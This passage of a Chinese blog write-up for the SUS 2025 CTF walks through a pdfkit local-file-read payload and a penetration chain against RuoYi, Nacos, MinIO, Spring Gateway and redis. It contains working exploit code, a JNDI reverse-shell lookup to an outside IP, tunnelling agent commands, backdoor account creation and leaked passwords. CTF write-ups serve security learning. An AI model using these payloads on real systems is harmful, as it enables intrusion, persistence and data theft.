+<p>第一时间想到利用<code>&lt;iframe src=file:///flag&gt;&lt;/iframe&gt;</code>在生成的<code>PDF</code>中读<code>flag</code>​</p>
+<p>但是默认是没有读取文件的权限的，看<code>pdfkit</code>在<code>Github</code>上的公告(<code>https://github.com/JazzCore/python-pdfkit?tab=readme-ov-file#deprecation-warning</code>)可以知道，可以利用<code>&lt;meta&gt;</code>标签手动添加</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20251006141709-y99nhhx.png" alt="image-20251006141709-y99nhhx"></p>
+<p>可添加的标签参考：<code>https://wkhtmltopdf.org/usage/wkhtmltopdf.txt</code>，发现<code>--enable-local-file-access</code>可以利用</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20251013155619963.png" alt="image-20251013155619963"></p>
+<p>于是构造<code>payload</code>​</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;pdfkit-enable-local-file-access&quot;</span> <span class="attr">content</span>=<span class="string">&quot;&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;file:///flag&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在本地测试是可以读到<code>flag</code>的</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20251006142035-knmruhd.png" alt="image-20251006142035-knmruhd"></p>
+<p>但是远程环境直接用<code>iframe</code>读不出来，所以直接写<code>javascript</code>脚本尝试</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;pdfkit-enable-local-file-access&quot;</span> <span class="attr">content</span>=<span class="string">&quot;&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">x=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>;x.<span class="property">onload</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="variable language_">this</span>.<span class="property">responseText</span>)&#125;;x.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;file:///flag&#x27;</span>);x.<span class="title function_">send</span>();</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>读到<code>flag</code>​</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20251006145602-3grradp.png" alt="image-20251006145602-3grradp"></p>
+<p>‍</p>
+<p>一键自动化脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://106.14.191.23:59021/generate_pdf&#x27;</span></span><br><span class="line"><span class="comment"># url = &#x27;http://localhost:3333/generate_pdf&#x27;</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;html_content&#x27;</span>: <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    &lt;html&gt;</span></span><br><span class="line"><span class="string">        &lt;head&gt;</span></span><br><span class="line"><span class="string">            &lt;meta name=&quot;pdfkit-enable-local-file-access&quot; content=&quot;&quot;/&gt;</span></span><br><span class="line"><span class="string">        &lt;/head&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;</span></span><br><span class="line"><span class="string">    &lt;/html&gt;</span></span><br><span class="line"><span class="string">    &lt;script&gt;x=new XMLHttpRequest;x.onload=function()&#123;document.write(this.responseText)&#125;;x.open(&#x27;GET&#x27;,&#x27;file:///flag&#x27;);x.send();&lt;/script&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(url, data=data)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(response.text))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.pdf&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(response.content)</span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+<h2 id="Pantest"><a href="#Pantest" class="headerlink" title="Pantest"></a>Pantest</h2><h3 id="pen4ruo1-1"><a href="#pen4ruo1-1" class="headerlink" title="pen4ruo1-1"></a>pen4ruo1-1</h3><p>登录口存在弱口令 <code>ruoyi:admin123</code> 进入后台</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20251006155049-292byjg.png" alt="image-20251006155049-292byjg"></p>
+<p>首先定时任务打<code>JNDI</code>注入，因为对关键字<code>http, rmi, ldap</code>进行了字符串检测，可以通过添加’的方法来绕过，参考 - <a target="_blank" rel="noopener" href="https://blog.takake.com/posts/7219/#2-6-3-%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E7%AD%96%E7%95%A5%EF%BC%88V-4-6-2-V-4-7-1%EF%BC%89">https://blog.takake.com/posts/7219/#2-6-3-%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E7%AD%96%E7%95%A5%EF%BC%88V-4-6-2-V-4-7-1%EF%BC%89</a></p>
+<p><code>javax.naming.InitialContext.lookup(&#39;ld&#39;ap://101.42.13.105:1389/Basic/ReverseShell/101.42.13.105/2333&#39;)</code><br><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20251013083053-c67sykl.png" alt="image-20251013083053-c67sykl"></p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20251013082904-14t7h3a.png" alt="image-20251013082904-14t7h3a"></p>
+<p><code>VShell</code>先上线维权</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20251013084507-8lz4k34.png" alt="image-20251013084507-8lz4k34"></p>
+<p>‍</p>
+<p>没有<code>ifconfig/ipconfig</code>，说明是<code>docker</code>，使用<code>ip a</code>查看<code>ip</code>​</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20251013084723-pw25pj9.png" alt="image-20251013084723-pw25pj9"></p>
+<p><code>fscan</code>信息搜集</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line">start <span class="title function_">infoscan</span></span><br><span class="line"><span class="params">(icmp)</span> Target <span class="number">172.31</span><span class="number">.4</span><span class="number">.1</span>      is <span class="title function_">alive</span></span><br><span class="line"><span class="params">(icmp)</span> Target <span class="number">172.31</span><span class="number">.4</span><span class="number">.2</span>      is <span class="title function_">alive</span></span><br><span class="line"><span class="params">(icmp)</span> Target <span class="number">172.31</span><span class="number">.4</span><span class="number">.3</span>      is <span class="title function_">alive</span></span><br><span class="line"><span class="params">(icmp)</span> Target <span class="number">172.31</span><span class="number">.4</span><span class="number">.4</span>      is <span class="title function_">alive</span></span><br><span class="line"><span class="params">(icmp)</span> Target <span class="number">172.31</span><span class="number">.4</span><span class="number">.5</span>      is <span class="title function_">alive</span></span><br><span class="line"><span class="params">(icmp)</span> Target <span class="number">172.31</span><span class="number">.4</span><span class="number">.6</span>      is <span class="title function_">alive</span></span><br><span class="line"><span class="params">(icmp)</span> Target <span class="number">172.31</span><span class="number">.4</span><span class="number">.7</span>      is <span class="title function_">alive</span></span><br><span class="line"><span class="params">(icmp)</span> Target <span class="number">172.31</span><span class="number">.4</span><span class="number">.8</span>      is <span class="title function_">alive</span></span><br><span class="line"><span class="params">(icmp)</span> Target <span class="number">172.31</span><span class="number">.4</span><span class="number">.9</span>      is <span class="title function_">alive</span></span><br><span class="line"><span class="params">(icmp)</span> Target <span class="number">172.31</span><span class="number">.4</span><span class="number">.10</span>     is alive</span><br><span class="line">[*] Icmp alive hosts len is: <span class="number">10</span></span><br><span class="line"><span class="number">172.31</span><span class="number">.4</span><span class="number">.1</span>:<span class="number">22</span> open</span><br><span class="line"><span class="number">172.31</span><span class="number">.4</span><span class="number">.10</span>:<span class="number">9200</span> open</span><br><span class="line"><span class="number">172.31</span><span class="number">.4</span><span class="number">.1</span>:<span class="number">7890</span> open</span><br><span class="line"><span class="number">172.31</span><span class="number">.4</span><span class="number">.5</span>:<span class="number">8848</span> open</span><br><span class="line"><span class="number">172.31</span><span class="number">.4</span><span class="number">.3</span>:<span class="number">9001</span> open</span><br><span class="line"><span class="number">172.31</span><span class="number">.4</span><span class="number">.1</span>:<span class="number">443</span> open</span><br><span class="line"><span class="number">172.31</span><span class="number">.4</span><span class="number">.1</span>:<span class="number">10250</span> open</span><br><span class="line"><span class="number">172.31</span><span class="number">.4</span><span class="number">.1</span>:<span class="number">8080</span> open</span><br><span class="line"><span class="number">172.31</span><span class="number">.4</span><span class="number">.2</span>:<span class="number">3306</span> open</span><br><span class="line"><span class="number">172.31</span><span class="number">.4</span><span class="number">.3</span>:<span class="number">9000</span> open</span><br><span class="line"><span class="number">172.31</span><span class="number">.4</span><span class="number">.6</span>:<span class="number">8080</span> open</span><br><span class="line"><span class="number">172.31</span><span class="number">.4</span><span class="number">.4</span>:<span class="number">6379</span> open</span><br><span class="line"><span class="number">172.31</span><span class="number">.4</span><span class="number">.1</span>:<span class="number">80</span> open</span><br><span class="line"><span class="number">172.31</span><span class="number">.4</span><span class="number">.7</span>:<span class="number">80</span> open</span><br><span class="line">[*] alive ports len is: <span class="number">14</span></span><br><span class="line">start vulscan</span><br><span class="line">[*] WebTitle http:<span class="comment">//172.31.4.7         code:200 len:12316  title:企业管理平台</span></span><br><span class="line">[*] WebTitle http:<span class="comment">//172.31.4.1         code:404 len:0      title:None</span></span><br><span class="line">[*] WebTitle http:<span class="comment">//172.31.4.1:7890    code:400 len:0      title:None</span></span><br><span class="line">[*] WebTitle http:<span class="comment">//172.31.4.3:9001    code:200 len:1309   title:MinIO Console</span></span><br><span class="line">[*] WebTitle http:<span class="comment">//172.31.4.3:9000    code:307 len:58     title:None 跳转url: http://172.31.4.3:9001</span></span><br><span class="line">[*] WebTitle http:<span class="comment">//172.31.4.1:8080    code:400 len:0      title:None</span></span><br><span class="line">[*] WebTitle http:<span class="comment">//172.31.4.3:9001    code:200 len:1309   title:MinIO Console</span></span><br><span class="line">[*] WebTitle https:<span class="comment">//172.31.4.1:10250  code:404 len:19     title:None</span></span><br><span class="line">[*] WebTitle http:<span class="comment">//172.31.4.5:8848    code:404 len:431    title:HTTP Status 404 – Not Found</span></span><br><span class="line">[*] WebTitle http:<span class="comment">//172.31.4.6:8080    code:200 len:34     title:None</span></span><br><span class="line">[*] WebTitle http:<span class="comment">//172.31.4.10:9200   code:404 len:275    title:None</span></span><br><span class="line">[+] PocScan http:<span class="comment">//172.31.4.5:8848 poc-yaml-alibaba-nacos </span></span><br><span class="line">[+] PocScan http:<span class="comment">//172.31.4.6:8080 poc-yaml-springboot-env-unauth spring2</span></span><br><span class="line">[+] PocScan http:<span class="comment">//172.31.4.6:8080 poc-yaml-spring-actuator-heapdump-file </span></span><br><span class="line">[+] PocScan http:<span class="comment">//172.31.4.10:9200 poc-yaml-spring-actuator-heapdump-file </span></span><br><span class="line">[+] PocScan http:<span class="comment">//172.31.4.10:9200 poc-yaml-springboot-env-unauth spring2</span></span><br><span class="line">ring-actuator-heapdump-file </span><br><span class="line">[+] PocScan http:<span class="comment">//172.31.4.10:9200 poc-yaml-springboot-env-unauth spring2</span></span><br><span class="line">root@66b5553412ad:/home/ruoyi# ls</span><br><span class="line">fscan  gost  logs  result.txt  ruoyi-modules-job.jar  tcp_linux_amd64</span><br><span class="line">root@66b5553412ad:/home/ruoyi# cat result.txt</span><br><span class="line">nohup: ignoring input</span><br><span class="line"></span><br><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| <span class="string">&#x27;__/ _` |/ __| |/ /</span></span><br><span class="line"><span class="string">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span></span><br><span class="line"><span class="string">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span></span><br><span class="line"><span class="string">                     fscan version: 1.8.4</span></span><br><span class="line"><span class="string">start infoscan</span></span><br><span class="line"><span class="string">(icmp) Target 172.31.4.1      is alive</span></span><br><span class="line"><span class="string">(icmp) Target 172.31.4.2      is alive</span></span><br><span class="line"><span class="string">(icmp) Target 172.31.4.3      is alive</span></span><br><span class="line"><span class="string">(icmp) Target 172.31.4.4      is alive</span></span><br><span class="line"><span class="string">(icmp) Target 172.31.4.5      is alive</span></span><br><span class="line"><span class="string">(icmp) Target 172.31.4.6      is alive</span></span><br><span class="line"><span class="string">(icmp) Target 172.31.4.7      is alive</span></span><br><span class="line"><span class="string">(icmp) Target 172.31.4.8      is alive</span></span><br><span class="line"><span class="string">(icmp) Target 172.31.4.9      is alive</span></span><br><span class="line"><span class="string">(icmp) Target 172.31.4.10     is alive</span></span><br><span class="line"><span class="string">[*] Icmp alive hosts len is: 10</span></span><br><span class="line"><span class="string">172.31.4.1:22 open</span></span><br><span class="line"><span class="string">172.31.4.10:9200 open</span></span><br><span class="line"><span class="string">172.31.4.1:7890 open</span></span><br><span class="line"><span class="string">172.31.4.5:8848 open</span></span><br><span class="line"><span class="string">172.31.4.3:9001 open</span></span><br><span class="line"><span class="string">172.31.4.1:443 open</span></span><br><span class="line"><span class="string">172.31.4.1:10250 open</span></span><br><span class="line"><span class="string">172.31.4.1:8080 open</span></span><br><span class="line"><span class="string">172.31.4.2:3306 open</span></span><br><span class="line"><span class="string">172.31.4.3:9000 open</span></span><br><span class="line"><span class="string">172.31.4.6:8080 open</span></span><br><span class="line"><span class="string">172.31.4.4:6379 open</span></span><br><span class="line"><span class="string">172.31.4.1:80 open</span></span><br><span class="line"><span class="string">172.31.4.7:80 open</span></span><br><span class="line"><span class="string">[*] alive ports len is: 14</span></span><br><span class="line"><span class="string">start vulscan</span></span><br><span class="line"><span class="string">[*] WebTitle http://172.31.4.7         code:200 len:12316  title:企业管理平台</span></span><br><span class="line"><span class="string">[*] WebTitle http://172.31.4.1         code:404 len:0      title:None</span></span><br><span class="line"><span class="string">[*] WebTitle http://172.31.4.1:7890    code:400 len:0      title:None</span></span><br><span class="line"><span class="string">[*] WebTitle http://172.31.4.3:9001    code:200 len:1309   title:MinIO Console</span></span><br><span class="line"><span class="string">[*] WebTitle http://172.31.4.3:9000    code:307 len:58     title:None 跳转url: http://172.31.4.3:9001</span></span><br><span class="line"><span class="string">[*] WebTitle http://172.31.4.1:8080    code:400 len:0      title:None</span></span><br><span class="line"><span class="string">[*] WebTitle http://172.31.4.3:9001    code:200 len:1309   title:MinIO Console</span></span><br><span class="line"><span class="string">[*] WebTitle https://172.31.4.1:10250  code:404 len:19     title:None</span></span><br><span class="line"><span class="string">[*] WebTitle http://172.31.4.5:8848    code:404 len:431    title:HTTP Status 404 – Not Found</span></span><br><span class="line"><span class="string">[*] WebTitle http://172.31.4.6:8080    code:200 len:34     title:None</span></span><br><span class="line"><span class="string">[*] WebTitle http://172.31.4.10:9200   code:404 len:275    title:None</span></span><br><span class="line"><span class="string">[+] PocScan http://172.31.4.5:8848 poc-yaml-alibaba-nacos </span></span><br><span class="line"><span class="string">[+] PocScan http://172.31.4.6:8080 poc-yaml-springboot-env-unauth spring2</span></span><br><span class="line"><span class="string">[+] PocScan http://172.31.4.6:8080 poc-yaml-spring-actuator-heapdump-file </span></span><br><span class="line"><span class="string">[+] PocScan http://172.31.4.10:9200 poc-yaml-spring-actuator-heapdump-file </span></span><br><span class="line"><span class="string">[+] PocScan http://172.31.4.10:9200 poc-yaml-springboot-env-unauth spring2</span></span><br><span class="line"><span class="string">已完成 14/15 [-] redis 172.31.4.4:6379 2wsx@WSX &lt;nil&gt; </span></span><br><span class="line"><span class="string">已完成 15/15</span></span><br><span class="line"><span class="string">[*] 扫描结束,耗时: 1m14.099222375s</span></span><br><span class="line"><span class="string">[1]+  Done                    nohup ./fscan -h 172.31.4.0/24 &gt; result.txt 2&gt;&amp;1</span></span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+<p>‍</p>
+<h3 id="pen4ruo1-2"><a href="#pen4ruo1-2" class="headerlink" title="pen4ruo1-2"></a>pen4ruo1-2</h3><p>先搭代理，使用<code>Stowaway</code> - <code>https://www.freebuf.com/sectool/359841.html</code>​</p>
+<p>服务端<code>VPS</code>​</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./linux_x64_admin -l <span class="number">7000</span> -s <span class="number">123</span></span><br></pre></td></tr></table></figure>
+
+<p>客户端(目标)</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./linux_x64_agent -c <span class="number">101.42</span><span class="number">.13</span><span class="number">.105</span>:<span class="number">7000</span> -s <span class="number">123</span> --reconnect <span class="number">8</span></span><br></pre></td></tr></table></figure>
+
+<p>建立连接后搭建<code>SOCKS5</code>代理</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socks <span class="number">1234</span></span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+<p>‍</p>
+<p>首先看<code>http://172.31.4.5:8848/nacos</code>的<code>Nacos</code>服务，尝试打<code>Nday</code>​</p>
+<h4 id="Nacos-token-secret-key默认配置"><a href="#Nacos-token-secret-key默认配置" class="headerlink" title="Nacos token.secret.key默认配置"></a>Nacos token.secret.key默认配置</h4><p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20251013094607-e67tibd.png" alt="image-20251013094607-e67tibd"></p>
+<p>发现存在<code>token.secret.key</code>默认配置，拦截登录返回包，手动将<code>403</code>修改为<code>200</code>并添加伪造的<code>json</code>​</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20251013094821-2xftlg5.png" alt="image-20251013094821-2xftlg5"></p>
+<p>修改后方包，成功登录进<code>Nacos</code>后台</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20251013094947-9n2hzlh.png" alt="image-20251013094947-9n2hzlh"></p>
+<h4 id="维权-Nacos-POST-添加账号"><a href="#维权-Nacos-POST-添加账号" class="headerlink" title="维权 - Nacos POST 添加账号"></a>维权 - Nacos POST 添加账号</h4><p>利用<code>POST</code>提交<code>http://172.31.4.5:8848/nacos/v1/auth/users?username=kagty1&amp;password=kagty1</code>可以添加<code>Nacos</code>用户 - 维权手段之一</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20251013140116-4xh31gv.png" alt="image-20251013140116-4xh31gv"></p>
+<p>‍</p>
+<h4 id="配置文件敏感信息利用"><a href="#配置文件敏感信息利用" class="headerlink" title="配置文件敏感信息利用"></a>配置文件敏感信息利用</h4><p><code>ruoyi-system-dev.yml</code>中泄露了<code>mysql</code>数据库的账号密码</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20251013140845-npystn0.png" alt="image-20251013140845-npystn0"></p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20251013141256-5kbk3tv.png" alt="image-20251013141256-5kbk3tv"></p>
+<p>‍</p>
+<h3 id="pen4ruo1-3"><a href="#pen4ruo1-3" class="headerlink" title="pen4ruo1-3"></a>pen4ruo1-3</h3><p>通过<code>ruoyi-file-dev.yml</code>，发现使用了<code>MinIO</code>，<strong>MinIO</strong> 是一个非常流行、高性能、开源的 <strong>对象存储（Object Storage）系统</strong>，专为云原生环境和大规模数据存储设计。它的接口兼容 Amazon S3，因此可以无缝替代或与 AWS S3 集成。</p>
+<p>可以拿到<code>ak, sk</code>，在<code>MinIO</code>中，<code>ak, sk</code>就是账号密码</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20251013142313-zlcbbz1.png" alt="image-20251013142313-zlcbbz1"></p>
+<p>可以看到桶中的全部文件，那个较小的文件中存的就是<code>flag</code>​</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20251013143158-1blehd6.png" alt="image-20251013143158-1blehd6"></p>
+<p>‍</p>
+<h3 id="pen4ruo1-4"><a href="#pen4ruo1-4" class="headerlink" title="pen4ruo1-4"></a>pen4ruo1-4</h3><p>根据扫描结果，<code>172.31.4.6:8080</code>还有服务，发现<code>/actuator</code>泄露，其中<code>/gateway</code>也有未授权</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20251013143845-7v6va73.png" alt="image-20251013143845-7v6va73"></p>
+<p>第一时间想到打<code>Spring Cloud Gateway SpeL RCE</code>​</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20251013144648-94hb5ny.png" alt="image-20251013144648-94hb5ny"></p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20251013144657-0t0c6ii.png" alt="image-20251013144657-0t0c6ii"></p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20251013144744-7l02chb.png" alt="image-20251013144744-7l02chb"></p>
+<h4 id="直接修改配置文件"><a href="#直接修改配置文件" class="headerlink" title="直接修改配置文件"></a>直接修改配置文件</h4><p>如图所示，可以在<code>Nacos</code>配置中心中修改<code>ruoyi-gateway-dev.yml</code>，直接修改<code>routes</code>，也可以实现相同的效果</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20251013145815-gwwnbsa.png" alt="image-20251013145815-gwwnbsa"></p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20251013150134-aaq0g5y.png" alt="image-20251013150134-aaq0g5y"></p>
+<p>‍</p>
+<h3 id="pen4ruo1-5"><a href="#pen4ruo1-5" class="headerlink" title="pen4ruo1-5"></a>pen4ruo1-5</h3><h4 id="redis主从复制RCE"><a href="#redis主从复制RCE" class="headerlink" title="redis主从复制RCE"></a>redis主从复制RCE</h4><p>根据<code>Nacos</code>中的配置文件，可以拿到<code>redis</code>的密码。</p>
+<p>可以直接打<code>redis</code>主从复制<code>RCE</code>​</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 redis_rogue_server.py -rhost=<span class="number">172.31</span><span class="number">.4</span><span class="number">.4</span> -passwd=<span class="string">&#x27;susctf@2025!@#(redis)&#x27;</span> -lhost=<span class="number">101.42</span><span class="number">.13</span><span class="number">.105</span> -lport=<span class="number">2333</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20251013152226-evxne79.png" alt="image-20251013152226-evxne79"></p>
+<p>‍</p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+              2025-10-13 16:02:22
+            </span>
+            
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SUS-2025-CTF"><span class="toc-text">SUS(2025) CTF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#am-i-admin"><span class="toc-text">am i admin?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#am-i-admin-2"><span class="toc-text">am i admin? 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easyprint"><span class="toc-text">easyprint</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pantest"><span class="toc-text">Pantest</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pen4ruo1-1"><span class="toc-text">pen4ruo1-1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pen4ruo1-2"><span class="toc-text">pen4ruo1-2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Nacos-token-secret-key%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE"><span class="toc-text">Nacos token.secret.key默认配置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%B4%E6%9D%83-Nacos-POST-%E6%B7%BB%E5%8A%A0%E8%B4%A6%E5%8F%B7"><span class="toc-text">维权 - Nacos POST 添加账号</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E5%88%A9%E7%94%A8"><span class="toc-text">配置文件敏感信息利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a 